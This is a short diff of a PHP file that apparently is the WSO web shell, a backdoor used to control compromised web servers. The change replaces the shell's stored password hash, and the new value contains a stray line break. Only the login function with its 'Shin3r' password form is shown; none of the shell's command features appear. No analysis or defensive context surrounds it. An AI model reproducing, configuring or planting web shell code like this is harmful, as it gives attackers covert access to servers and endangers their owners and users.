@@ -1,5 +1,6 @@
 <?php 
-$auth_pass = "b8cca8aaa6bc857e27f1bed1967950d5";
+$auth_pass = "fb3bc9ec28a02c3031fa2de4baea9790
+";
 function wsoLogin() {
 	die("<pre align=center><form method=post>Shin3r: <input type=password name=pass><input type=submit value='>>'></form></pre>");
 }
